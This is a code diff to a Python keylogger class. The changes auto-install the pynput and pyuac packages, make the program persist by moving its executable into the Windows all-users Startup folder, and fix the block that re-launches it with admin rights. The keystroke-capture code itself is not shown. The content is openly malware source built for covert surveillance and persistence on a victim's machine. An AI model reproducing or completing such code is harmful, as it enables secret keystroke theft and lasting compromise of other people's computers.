@@ -1,12 +1,20 @@
-
-from _typeshed import ExcInfo
-from pynput import keyboard
-from pynput.keyboard import Listener
-from datetime import datetime
+from re import sub
+import subprocess
 import os
 import sys
+import shutil
+requiredModules = ["pynput", "datetime", "pyuac"]
+
+for module in requiredModules:
+    try:
+        __import__(module)
+    except ModuleNotFoundError:
+        subprocess.run(["pip", "install", module])
+
+from datetime import datetime
 import pyuac
-# pip install pypiwin32
+
+
 class Keylogger:
 
     def __init__(self):
@@ -14,16 +22,14 @@ class Keylogger:
 
     # this are primary methods which should be done
     def addToStartup(self):
-        scriptPath = os.path.abspath(sys.argv[0])
-        key = r"Software\Microsoft\Windows\CurrentVersion\Run"
-
         try:
-            pass
-        
-        except:
-            pass
-
-    
+            startupFolder = os.path.join(os.getenv("ProgramData"), "Microsoft", "Windows",
+                                         "Start Menu", "Programs", "Startup")
+            exePath = os.path.abspath(sys.argv[0])
+            shutil.move(exePath, os.path.join(startupFolder, os.path.basename(sys.argv[0])))
+        except Exception as e:
+            print("error in moving .exe to startup")
+            print(e)
 
     # This are easy methods to understand
 
@@ -61,7 +67,7 @@ if __name__ == "__main__":
         print("Re-launching as admin!")
         try:
             pyuac.runAsAdmin()
-        except Exception a e:
+        except Exception as e:
             try:
                 pyuac.runAsAdmin()
             except:
